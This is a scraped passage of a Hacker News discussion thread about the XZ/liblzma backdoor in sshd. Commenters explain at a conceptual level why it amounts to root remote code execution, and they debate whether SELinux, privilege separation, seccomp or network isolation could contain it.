<!DOCTYPE html><html lang="en"><head><title>Static News</title><meta charSet="utf-8"/><meta name="description" content="Static delayed Hacker News."/><meta name="theme-color" media="(prefers-color-scheme: light)" content="white"/><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1d1f21"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><meta name="application-name" content="Static News"/><meta name="apple-mobile-web-app-title" content="Static News"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="#1d1f21"/><link rel="preload" href="styles.css?v=1711875653635" as="style"/><link rel="stylesheet" href="styles.css?v=1711875653635"/></head><body><div id="container"><div id="inner"><header><a href="/">Static News</a><a href="/about">about</a></header><div id="content"><div><div id="title"><a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b">XZ backdoor: &quot;It&#x27;s RCE, not auth bypass, and gated/unreplayable.&quot;</a> <span class="domain">(<a href="https://bsky.app">bsky.app</a>)</span></div><div class="subtext"><span>junon</span> | <span>536 comments</span></div><br/><div><div id="39877312" class="c"><input type="checkbox" id="c-39877312" checked=""/><div class="controls bullet"><span class="by">junon</span><span>|</span><a href="#39878872">next</a><span>|</span><label class="collapse" for="c-39877312">[-]</label><label class="expand" for="c-39877312">[75 more]</label></div><br/><div class="children"><div class="content">EDIT: Here&#x27;s some more RE work on the matter. Has some symbol remapping information that was extracted from the prefix trie the backdoor used to hide strings. Looks like it tried to hide itself even from RE&#x2F;analysis, too.<p><a href="https:&#x2F;&#x2F;gist.github.com&#x2F;smx-smx&#x2F;a6112d54777845d389bd7126d6e9f504" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;smx-smx&#x2F;a6112d54777845d389bd7126d6e9...</a><p>Full list of decoded strings here:<p><a href="https:&#x2F;&#x2F;gist.github.com&#x2F;q3k&#x2F;af3d93b6a1f399de28fe194add452d01" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;q3k&#x2F;af3d93b6a1f399de28fe194add452d01</a><p>--<p>For someone unfamiliar with openssl&#x27;s internals (like me): The N value, I presume, is pulled from the `n` field of `rsa_st`:<p><a href="https:&#x2F;&#x2F;github.com&#x2F;openssl&#x2F;openssl&#x2F;blob&#x2F;56e63f570bd5a479439bc6f6a2499f6b86ded341&#x2F;crypto&#x2F;rsa&#x2F;rsa_local.h#L62C5-L62C12">https:&#x2F;&#x2F;github.com&#x2F;openssl&#x2F;openssl&#x2F;blob&#x2F;56e63f570bd5a479439b...</a><p>Which is a `BIGNUM`:<p><a href="https:&#x2F;&#x2F;github.com&#x2F;openssl&#x2F;openssl&#x2F;blob&#x2F;56e63f570bd5a479439bc6f6a2499f6b86ded341&#x2F;crypto&#x2F;bn&#x2F;bn_local.h#L245">https:&#x2F;&#x2F;github.com&#x2F;openssl&#x2F;openssl&#x2F;blob&#x2F;56e63f570bd5a479439b...</a><p>Which appears to be a variable length type.<p>The back door pulls this from the certificate received from a remote attacker, attempts to decrypt it with ChaCha20, and if it decrypts successfully, passed to `system()`, which is essentially a simple wrapper that executes a line of shellscript under whichever user the process is currently executing.<p>If I&#x27;m understanding things correctly, this is worse than a public key bypass (which myself and I think a number of others presumed it might be) - a public key bypass would, in theory, only allow you access as the user you&#x27;re logging in with. Assumedly, hardened SSH configurations would disallow root access.<p>However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root.<p>Wild. This is about as bad as a widespread RCE can realistically get.</div><br/><div id="39877773" class="c"><input type="checkbox" id="c-39877773" checked=""/><div class="controls bullet"><span class="by">jeroenhd</span><span>|</span><a href="#39877312">parent</a><span>|</span><a href="#39879674">next</a><span>|</span><label class="collapse" for="c-39877773">[-]</label><label class="expand" for="c-39877773">[70 more]</label></div><br/><div class="children"><div class="content">&gt; However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root.<p>With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions. However, applying a sandbox to an SSH daemon effectively is very difficult.</div><br/><div id="39878918" class="c"><input type="checkbox" id="c-39878918" checked=""/><div class="controls bullet"><span class="by">semiquaver</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39880304">next</a><span>|</span><label class="collapse" for="c-39878918">[-]</label><label class="expand" for="c-39878918">[40 more]</label></div><br/><div class="children"><div class="content">Could you explain how SELinux could <i>ever</i> sandbox against RCE in sshd? Its purpose is to grant login shells to arbitrary users, after all.</div><br/><div id="39879358" class="c"><input type="checkbox" id="c-39879358" checked=""/><div class="controls bullet"><span class="by">saltcured</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878918">parent</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39879358">[-]</label><label class="expand" for="c-39879358">[15 more]</label></div><br/><div class="children"><div class="content">You could refactor sshd so most network payload processing is delegated to sandboxed sub-processes. Then an RCE there has less capabilities to exploit directly. But, I think you would have to assume an RCE can cause the sub-process to produce wrong answers. So if the answers are authorization decisions, you can transitively turn those wrong answers into RCE in the normal login or remote command execution context.<p>But, the normal login or remote command execution is at least audited. And it might have other enforcement of which accounts or programs are permitted. A configuration disallowing root could not be bypassed by the sub-process.<p>You could also decide to run all user logins&#x2F;commands under some more confined SE-Linux process context. Then, the actual user sessions would be sandboxed compared to the real local root user. Of course, going too far with this may interfere with the desired use cases for SSH.</div><br/><div id="39881177" class="c"><input type="checkbox" id="c-39881177" checked=""/><div class="controls bullet"><span class="by">nrdvana</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879358">parent</a><span>|</span><a href="#39879480">next</a><span>|</span><label class="collapse" for="c-39881177">[-]</label><label class="expand" for="c-39881177">[4 more]</label></div><br/><div class="children"><div class="content">That just raises the hurdle for the attacker.  The attacker in this case has full control to replace any function within ssh with their own version, and the master process of sshd will always need the ability to fork and still be root on the child process before dropping privileges.  I don&#x27;t see any way around that.  They only needed to override one function this time, but if you raise the bar they would just override more functions and still succeed.</div><br/><div id="39882294" class="c"><input type="checkbox" id="c-39882294" checked=""/><div class="controls bullet"><span class="by">tomasGiden</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881177">parent</a><span>|</span><a href="#39881728">next</a><span>|</span><label class="collapse" for="c-39882294">[-]</label><label class="expand" for="c-39882294">[2 more]</label></div><br/><div class="children"><div class="content">I’m highly safety critical systems you have software (and hardware) diversity were multiple pieces of software, developed independently, have to vote on the result. Maybe highly critical pieces of Linux like the login process should be designed the same way. So that two binaries without common dependencies would need to accept the login for the user to get privileges.<p>Exactly how to do it (especially transparently for the user), I have no idea though. Maybe sending ssh login requests to two different sshd implementations and if they don’t do the same things (same system calls), they are both killed.<p>Or some kind of two step login process where the first login only gives access to the sandbox of the second login process.<p>But in general I assume the Linux attack surface is too big to do software diversity for all of it.</div><br/><div id="39882507" class="c"><input type="checkbox" id="c-39882507" checked=""/><div class="controls bullet"><span class="by">rigid</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39882294">parent</a><span>|</span><a href="#39881728">next</a><span>|</span><label class="collapse" for="c-39882507">[-]</label><label class="expand" for="c-39882507">[1 more]</label></div><br/><div class="children"><div class="content">&gt; login process<p>RCE doesn&#x27;t really follow a login process design. As soon as you got RCE you can be considered pwned.<p>If not now, then at the time the next locally exploitable vulnerability comes up. There are plenty.</div><br/></div></div></div></div><div id="39881728" class="c"><input type="checkbox" id="c-39881728" checked=""/><div class="controls bullet"><span class="by">lovasoa</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881177">parent</a><span>|</span><a href="#39882294">prev</a><span>|</span><a href="#39879480">next</a><span>|</span><label class="collapse" for="c-39881728">[-]</label><label class="expand" for="c-39881728">[1 more]</label></div><br/><div class="children"><div class="content">&gt;  The attacker in this case has full control to replace any function within ssh with their own version<p>Not true. They have this ability only for binaries that are linked to liblzma. If sshd were to be decomposed into multiple processes, not all of them would (hopefully) depend on all the libraries that the original sshd depended on.</div><br/></div></div></div></div><div id="39879480" class="c"><input type="checkbox" id="c-39879480" checked=""/><div class="controls bullet"><span class="by">asveikau</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879358">parent</a><span>|</span><a href="#39881177">prev</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39879480">[-]</label><label class="expand" for="c-39879480">[10 more]</label></div><br/><div class="children"><div class="content">I thought that OpenSSH&#x27;s sshd already separates itself into a privileged process and a low-privilege process. I don&#x27;t know any details about that. Here&#x27;s what Google showed me for that: <a href="https:&#x2F;&#x2F;github.com&#x2F;openssh&#x2F;openssh-portable&#x2F;blob&#x2F;master&#x2F;README.privsep">https:&#x2F;&#x2F;github.com&#x2F;openssh&#x2F;openssh-portable&#x2F;blob&#x2F;master&#x2F;READ...</a></div><br/><div id="39879523" class="c"><input type="checkbox" id="c-39879523" checked=""/><div class="controls bullet"><span class="by">treasy</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879480">parent</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39879523">[-]</label><label class="expand" for="c-39879523">[9 more]</label></div><br/><div class="children"><div class="content">If you look at the diagram of privsep, the authentication process is part of the privileged binary, which is where this RCE lives<p><a href="http:&#x2F;&#x2F;www.citi.umich.edu&#x2F;u&#x2F;provos&#x2F;ssh&#x2F;priv.jpg" rel="nofollow">http:&#x2F;&#x2F;www.citi.umich.edu&#x2F;u&#x2F;provos&#x2F;ssh&#x2F;priv.jpg</a></div><br/><div id="39879931" class="c"><input type="checkbox" id="c-39879931" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879523">parent</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39879931">[-]</label><label class="expand" for="c-39879931">[8 more]</label></div><br/><div class="children"><div class="content">The signature validation could be moved into an unprivileged process forked from that one.</div><br/><div id="39880541" class="c"><input type="checkbox" id="c-39880541" checked=""/><div class="controls bullet"><span class="by">mjg59</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879931">parent</a><span>|</span><a href="#39880256">next</a><span>|</span><label class="collapse" for="c-39880541">[-]</label><label class="expand" for="c-39880541">[3 more]</label></div><br/><div class="children"><div class="content">It wouldn&#x27;t matter in this case, since the exploit could simply rewrite the function that calls out to the unprivileged process. If you already have malicious code in your privileged parent process there&#x27;s no way to recover from that.</div><br/><div id="39880990" class="c"><input type="checkbox" id="c-39880990" checked=""/><div class="controls bullet"><span class="by">CanaryLayout</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880541">parent</a><span>|</span><a href="#39880256">next</a><span>|</span><label class="collapse" for="c-39880990">[-]</label><label class="expand" for="c-39880990">[2 more]</label></div><br/><div class="children"><div class="content">Exactly.  The attack came in by hitching a ride on to systemd.<p>sshd is not the problem.  the ldd&#x2F;monolith architecture surrounding systemd is.<p>What if I duplicated this attack but instead targeted dbus or any other thing that systemd is managing?</div><br/><div id="39881524" class="c"><input type="checkbox" id="c-39881524" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880990">parent</a><span>|</span><a href="#39880256">next</a><span>|</span><label class="collapse" for="c-39881524">[-]</label><label class="expand" for="c-39881524">[1 more]</label></div><br/><div class="children"><div class="content">No, the problem is that someone had access to backdoor code that runs in a privileged process.</div><br/></div></div></div></div></div></div><div id="39880256" class="c"><input type="checkbox" id="c-39880256" checked=""/><div class="controls bullet"><span class="by">littlestymaar</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879931">parent</a><span>|</span><a href="#39880541">prev</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39880256">[-]</label><label class="expand" for="c-39880256">[4 more]</label></div><br/><div class="children"><div class="content">That&#x27;s an easy thing to say after the fact indeed but yes. In fact after such a disastrous backdoor I wouldn&#x27;t be surprised if OpenSSH moved all code calling external libraries to unprivileged processes to make sure such an attack can never have such a dramatic effect (an auth bypass would still likely be possible, but that&#x27;s still way better than a root RCE…).<p>At this point “All libraries could be malicious” is a threat model that must be considered for something as security critical as OpenSSH.</div><br/><div id="39880836" class="c"><input type="checkbox" id="c-39880836" checked=""/><div class="controls bullet"><span class="by">asveikau</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880256">parent</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39880836">[-]</label><label class="expand" for="c-39880836">[3 more]</label></div><br/><div class="children"><div class="content">I don&#x27;t think that&#x27;s a threat model that OpenSSH should waste too much time on. Ultimately this is malicious code in the build machine compiling a critical system library. That&#x27;s not reasonable to defend against.<p>Keep in mind that upstream didn&#x27;t even link to liblzma. Debian patched it to do so. OpenSSH should defend against that too?</div><br/><div id="39881587" class="c"><input type="checkbox" id="c-39881587" checked=""/><div class="controls bullet"><span class="by">astrange</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880836">parent</a><span>|</span><a href="#39881000">next</a><span>|</span><label class="collapse" for="c-39881587">[-]</label><label class="expand" for="c-39881587">[1 more]</label></div><br/><div class="children"><div class="content">It is possible to prevent libraries from patching functions in other libraries; make those VM regions unwritable, don&#x27;t let anyone make them writable, and adopt PAC or similar hardware protection so the kernel can&#x27;t overwrite them either.</div><br/></div></div><div id="39881000" class="c"><input type="checkbox" id="c-39881000" checked=""/><div class="controls bullet"><span class="by">CanaryLayout</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880836">parent</a><span>|</span><a href="#39881587">prev</a><span>|</span><a href="#39879420">next</a><span>|</span><label class="collapse" for="c-39881000">[-]</label><label class="expand" for="c-39881000">[1 more]</label></div><br/><div class="children"><div class="content">any one of us if we sat on the OSSH team would flip the middle finger.   What code is the project supposed to write when nothing on main dyn loaded liblzma.  It was brought in from a patch they don&#x27;t have realistic control over.<p>This is a Linux problem, and the problem is systemd, which is who brought the lib into memory and init&#x27;d it.</div><br/></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div id="39879420" class="c"><input type="checkbox" id="c-39879420" checked=""/><div class="controls bullet"><span class="by">treasy</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878918">parent</a><span>|</span><a href="#39879358">prev</a><span>|</span><a href="#39879278">next</a><span>|</span><label class="collapse" for="c-39879420">[-]</label><label class="expand" for="c-39879420">[3 more]</label></div><br/><div class="children"><div class="content">You can definitely prevent a lot of file&#x2F;executable accesses via SELinux by running sshd in the default sshd_t or even customizing your own sshd domain and preventing sshd from being able to run binaries in its own domain without a transition.  What you cannot prevent though is certain things that sshd _requires_ to function like certain capabilities and networking access.<p>by default sshd has access to all files in &#x2F;home&#x2F;$user&#x2F;.ssh&#x2F;, but that could be prevented by giving private keys a new unique file context, etc.<p>SELinux would not prevent all attacks, but it can mitigate quite a few as part of a larger security posture</div><br/><div id="39879590" class="c"><input type="checkbox" id="c-39879590" checked=""/><div class="controls bullet"><span class="by">transpute</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879420">parent</a><span>|</span><a href="#39879278">next</a><span>|</span><label class="collapse" for="c-39879590">[-]</label><label class="expand" for="c-39879590">[2 more]</label></div><br/><div class="children"><div class="content"><a href="https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39879559">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=39879559</a><p><i>&gt; Libselinux pulls in liblzma too</i></div><br/><div id="39879687" class="c"><input type="checkbox" id="c-39879687" checked=""/><div class="controls bullet"><span class="by">treasy</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879590">parent</a><span>|</span><a href="#39879278">next</a><span>|</span><label class="collapse" for="c-39879687">[-]</label><label class="expand" for="c-39879687">[1 more]</label></div><br/><div class="children"><div class="content">libselinux is the userspace tooling for selinux, it is irrelevant to this specific discussion as the backdoor does not target selinux in any way, and sshd does not have the capabilities required to make use of the libselinux tooling anyway<p>libselinux is just an unwitting vector to link liblzma with openssh</div><br/></div></div></div></div></div></div><div id="39879278" class="c"><input type="checkbox" id="c-39879278" checked=""/><div class="controls bullet"><span class="by">ajross</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878918">parent</a><span>|</span><a href="#39879420">prev</a><span>|</span><a href="#39879357">next</a><span>|</span><label class="collapse" for="c-39879278">[-]</label><label class="expand" for="c-39879278">[9 more]</label></div><br/><div class="children"><div class="content">It&#x27;s possible to spawn a sshd as an unprivileged or partially-capabilitized process.  Such as sandbox isn&#x27;t the default deployment, but it&#x27;s done often enough and would work as designed to prevent privilege elevation above the sshd process.</div><br/><div id="39879319" class="c"><input type="checkbox" id="c-39879319" checked=""/><div class="controls bullet"><span class="by">admax88qqq</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879278">parent</a><span>|</span><a href="#39879357">next</a><span>|</span><label class="collapse" for="c-39879319">[-]</label><label class="expand" for="c-39879319">[8 more]</label></div><br/><div class="children"><div class="content">How can sshd spawn interactive sessions for other users if it&#x27;s sandboxed?</div><br/><div id="39879489" class="c"><input type="checkbox" id="c-39879489" checked=""/><div class="controls bullet"><span class="by">kbolino</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879319">parent</a><span>|</span><a href="#39879343">next</a><span>|</span><label class="collapse" for="c-39879489">[-]</label><label class="expand" for="c-39879489">[6 more]</label></div><br/><div class="children"><div class="content">SELinux does not rely on the usual UID&#x2F;GID to determine what a process can do. System services, even when running as &quot;root&quot;, are running as confined users in SELinux. Confined root cannot do anything which SELinux policy does not allow it to do. This means you can let sshd create new sessions for non-root users while still blocking it from doing the other things which <i>unconfined</i> root would be able to do. This is still a lot of power but it&#x27;s not the godlike access which a person logged in as (unconfined) root has.</div><br/><div id="39879620" class="c"><input type="checkbox" id="c-39879620" checked=""/><div class="controls bullet"><span class="by">quotemstr</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879489">parent</a><span>|</span><a href="#39879343">next</a><span>|</span><label class="collapse" for="c-39879620">[-]</label><label class="expand" for="c-39879620">[5 more]</label></div><br/><div class="children"><div class="content">Doesn&#x27;t matter. A malicious sshd able to run commands arbitrary users can just run malicious commands as those users.<p>We&#x27;d need something more like a cryptographically attested setreuid() and execve() combination that would run only commands signed with the private key of the intended user. You&#x27;d want to use a shared clock or something to protect against replay attacks</div><br/><div id="39879640" class="c"><input type="checkbox" id="c-39879640" checked=""/><div class="controls bullet"><span class="by">kbolino</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879620">parent</a><span>|</span><a href="#39879343">next</a><span>|</span><label class="collapse" for="c-39879640">[-]</label><label class="expand" for="c-39879640">[4 more]</label></div><br/><div class="children"><div class="content">Yes, this won&#x27;t directly protect against an attacker whose goal is to create a botnet, mine some crypto on your dime, etc. However, it will protect against corruption of the O&#x2F;S itself and, in tandem with other controls, can limit the abilities an attacker has, and ensure things like auditing are still enforced (which can be tied to monitoring, and also used for forensics).<p>Whether it&#x27;s worth it or not depends on circumstances. In many cloud environments, nuking the VM instance and starting over is probably easier than fiddling with SELinux.</div><br/><div id="39881132" class="c"><input type="checkbox" id="c-39881132" checked=""/><div class="controls bullet"><span class="by">CanaryLayout</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879640">parent</a><span>|</span><a href="#39879343">next</a><span>|</span><label class="collapse" for="c-39881132">[-]</label><label class="expand" for="c-39881132">[3 more]</label></div><br/><div class="children"><div class="content">even easier is to STOP HOSTING SSHD ON IPV4 ON CLEARNET<p>at minimum, ipv6 only if you absolutely must do it (it absolutely cuts the scans way down)<p>better is to only host it on vpn<p>even better is to only activate it with a portknocker, over vpn<p>even better-better is to set up a private ipv6 peer-to-peer cloud and socat&#x2F;relay to the private ipv6 network (yggdrasil comes to mind, but there&#x27;s other solutions to darknet)<p>your sshd you need for server maintenance&#x2F;scp&#x2F;git&#x2F;rsync should never be hosted on ipv4 clearnet where a chinese bot will find it 3 secs after the route is established after boot.</div><br/><div id="39882245" class="c"><input type="checkbox" id="c-39882245" checked=""/><div class="controls bullet"><span class="by">dvdkon</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881132">parent</a><span>|</span><a href="#39881765">next</a><span>|</span><label class="collapse" for="c-39882245">[-]</label><label class="expand" for="c-39882245">[1 more]</label></div><br/><div class="children"><div class="content">How about making ssh as secure as (or more secure than) the VPN you&#x27;d put it behind? Considering the amount of vulnerabilities in corporate VPNs, I&#x27;d even put my money on OpenSSH today.<p>It&#x27;s not like this is SSH&#x27;s fault anyway, a supply chain attack could just as well backdoor some Fortinet appliance.</div><br/></div></div><div id="39881765" class="c"><input type="checkbox" id="c-39881765" checked=""/><div class="controls bullet"><span class="by">alrs</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881132">parent</a><span>|</span><a href="#39882245">prev</a><span>|</span><a href="#39879343">next</a><span>|</span><label class="collapse" for="c-39881765">[-]</label><label class="expand" for="c-39881765">[1 more]</label></div><br/><div class="children"><div class="content">Who cares about scans? Who cares if a scan comes in 4 or 6?</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39879343" class="c"><input type="checkbox" id="c-39879343" checked=""/><div class="controls bullet"><span class="by">ajross</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879319">parent</a><span>|</span><a href="#39879489">prev</a><span>|</span><a href="#39879357">next</a><span>|</span><label class="collapse" for="c-39879343">[-]</label><label class="expand" for="c-39879343">[1 more]</label></div><br/><div class="children"><div class="content">Plausibly by having set-user-ID capability but not others an attacker might need.<p>But in the more common case it just doesn&#x27;t: you have an sshd running on a dedicated port for the sole purpose of running some service or another under a specific sandboxed UID.  That&#x27;s basically the github business model, for example.</div><br/></div></div></div></div></div></div><div id="39879357" class="c"><input type="checkbox" id="c-39879357" checked=""/><div class="controls bullet"><span class="by">kbolino</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878918">parent</a><span>|</span><a href="#39879278">prev</a><span>|</span><a href="#39880304">next</a><span>|</span><label class="collapse" for="c-39879357">[-]</label><label class="expand" for="c-39879357">[12 more]</label></div><br/><div class="children"><div class="content">Even though sshd must run as root (in the usual case), it doesn&#x27;t need unfettered access to kernel memory, most of the filesystem, most other processes, etc. However, you could only really sandbox sshd-as-root. In order for sshd to do its job, it does need to be able to masquerade as arbitrary non-root users. That&#x27;s still pretty bad but generally not &quot;undetectably alter the operating system or firmware&quot; bad.</div><br/><div id="39879565" class="c"><input type="checkbox" id="c-39879565" checked=""/><div class="controls bullet"><span class="by">sweetjuly</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879357">parent</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39879565">[-]</label><label class="expand" for="c-39879565">[10 more]</label></div><br/><div class="children"><div class="content">&gt;Even though sshd must run as root (in the usual case), it doesn&#x27;t need unfettered access to kernel memory, most of the filesystem, most other processes, etc<p>This is sort of overlooking the problem. While true, the processes spawned by sshd do need to be able to do all these things and so even if you did sandbox it, preserving functionality would all but guarantee an escape is trivial (...just spawn bash?).</div><br/><div id="39879599" class="c"><input type="checkbox" id="c-39879599" checked=""/><div class="controls bullet"><span class="by">kbolino</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879565">parent</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39879599">[-]</label><label class="expand" for="c-39879599">[9 more]</label></div><br/><div class="children"><div class="content">SELinux context is passed down to child processes. If sshd is running as confined root (system_u:system_r:sshd_t or similar), then the bash spawned by RCE will be too. Even if sshd is allowed to masquerade as an unconfined non-root user, that user will (regardless of SELinux) be unable to read or write &#x2F;dev&#x2F;kmem, ignore standard file permissions, etc.</div><br/><div id="39879932" class="c"><input type="checkbox" id="c-39879932" checked=""/><div class="controls bullet"><span class="by">sweetjuly</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879599">parent</a><span>|</span><a href="#39879943">next</a><span>|</span><label class="collapse" for="c-39879932">[-]</label><label class="expand" for="c-39879932">[4 more]</label></div><br/><div class="children"><div class="content">That&#x27;s my point though--users expect to be able to do those things over ssh. Sandboxing sshd is hard because its child processes are expected to be able to do anything that an admin sitting at the console could do, up to and including reading&#x2F;writing kernel memory.</div><br/><div id="39880178" class="c"><input type="checkbox" id="c-39880178" checked=""/><div class="controls bullet"><span class="by">kbolino</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879932">parent</a><span>|</span><a href="#39879943">next</a><span>|</span><label class="collapse" for="c-39880178">[-]</label><label class="expand" for="c-39880178">[3 more]</label></div><br/><div class="children"><div class="content">I&#x27;m assuming SSH root login is disabled and sudo requires separate authentication to elevate, but yeah, if there&#x27;s a way to elevate yourself to unconfined root trivially after logging in, this doesn&#x27;t buy you anything.<p>Now, sandboxing sudo (in the general case) with SELinux probably isn&#x27;t possible.</div><br/><div id="39881086" class="c"><input type="checkbox" id="c-39881086" checked=""/><div class="controls bullet"><span class="by">CanaryLayout</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880178">parent</a><span>|</span><a href="#39879943">next</a><span>|</span><label class="collapse" for="c-39881086">[-]</label><label class="expand" for="c-39881086">[2 more]</label></div><br/><div class="children"><div class="content">This does not matter either.   The attack came in by loading into systemd via liblzma.  It put on a hook and then sits around waiting for sshd to load in so it can learn the symbols then proceeds to swap in the jumps.<p>sshd is a sitting duck.  Bifurcating sshd into a multimodule scheme won&#x27;t work because some part of it still has to be loaded by systemd.<p>This is a web of trust issue.   In the .NET world where refection attacks happen to commercial software that features dynload assemblies, the only solution they could come up with is to sign all the things, then box up anything that doesn&#x27;t have a signing mechanism and then sign that, even signing plain old zip files.<p>Some day we will all have to have keys, and to keep the anon people from leaving they can get an anon key, but anons with keys will never get on the chain where the big distros would ever trust their commits until someone who forked over their passport and photos got a trustable key to sign off on the commits, so that the distro builders can then greenlight pulling it in.<p>Then I guess to keep the anons hopeful that they are still in the SDLC somewhere their commits can go into the completely untrusted-unstable-crazytown release that no instutution in their right mind would ever lay down in production.</div><br/><div id="39882459" class="c"><input type="checkbox" id="c-39882459" checked=""/><div class="controls bullet"><span class="by">LtWorf</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881086">parent</a><span>|</span><a href="#39879943">next</a><span>|</span><label class="collapse" for="c-39882459">[-]</label><label class="expand" for="c-39882459">[1 more]</label></div><br/><div class="children"><div class="content">Anons will just steal identities, and randos will get accused of hacking they didn&#x27;t do.</div><br/></div></div></div></div></div></div></div></div><div id="39879943" class="c"><input type="checkbox" id="c-39879943" checked=""/><div class="controls bullet"><span class="by">semiquaver</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879599">parent</a><span>|</span><a href="#39879932">prev</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39879943">[-]</label><label class="expand" for="c-39879943">[4 more]</label></div><br/><div class="children"><div class="content">I’ll admit to not being an expert in SELinux, but it seems like an impossibly leaky proposition. Root can modify systemd startup files, so just do that in a malicious way and reboot the system. <i>that</i> context won’t be propagated. And if you somehow prohibit root from doing that by SELinux policy then you end up with a system that can’t actually be administered.<p>[edit: sibling sweetjuly said it better than I could. I doubt that this much more than a fig leaf on any real world system given what sshd is <i>required</i> to have to do.]</div><br/><div id="39880106" class="c"><input type="checkbox" id="c-39880106" checked=""/><div class="controls bullet"><span class="by">treasy</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879943">parent</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39880106">[-]</label><label class="expand" for="c-39880106">[3 more]</label></div><br/><div class="children"><div class="content">Selinux domains are uncoupled from Linux users.  If sshd does not have Selinux permissions to edit those files it will simply be denied.  Even if sshd is run as root</div><br/><div id="39881930" class="c"><input type="checkbox" id="c-39881930" checked=""/><div class="controls bullet"><span class="by">semiquaver</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880106">parent</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39881930">[-]</label><label class="expand" for="c-39881930">[2 more]</label></div><br/><div class="children"><div class="content">Which amounts to the un-administerable system I mentioned. If it’s not possible to modify systemd config files using ssh, <i>what happens when you need to edit them</i>?</div><br/><div id="39882446" class="c"><input type="checkbox" id="c-39882446" checked=""/><div class="controls bullet"><span class="by">kimixa</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39881930">parent</a><span>|</span><a href="#39880216">next</a><span>|</span><label class="collapse" for="c-39882446">[-]</label><label class="expand" for="c-39882446">[1 more]</label></div><br/><div class="children"><div class="content">Really what they&#x27;re proposing here is a non-modifiable system, where the root is read-only and no user can modify anything important.<p>Which is nice and all, but that implies a &quot;parent&quot; system that creates and deploys those systems. Which people likely want remote access to.. Probably by sshd...</div><br/></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div id="39880304" class="c"><input type="checkbox" id="c-39880304" checked=""/><div class="controls bullet"><span class="by">dhx</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39878918">prev</a><span>|</span><a href="#39878184">next</a><span>|</span><label class="collapse" for="c-39880304">[-]</label><label class="expand" for="c-39880304">[2 more]</label></div><br/><div class="children"><div class="content">sshd is probably the softest target on most systems. It is generally expected (and setup by default) so that people can gain a root shell that provides unrestricted access.<p>sshd.service will typically score 9.6&#x2F;10 for &quot;systemd-analyze security sshd.service&quot; where 10 is the worst score. When systemd starts a process, it does so by using systemd-nspawn to setup a (usually) restricted namespace and apply seccomp filters before the process is then executed. seccomp filters are inherited by child processes, which can then only further restrict privileges but not expand upon the inherited privileges. openssh-portable on Linux does apply seccomp filters to child processes but this is useless in this attack scenario because sshd is backdoored by the xz library, and the backdoored library can just disable&#x2F;change those seccomp filters before sshd is executed.<p>sshd 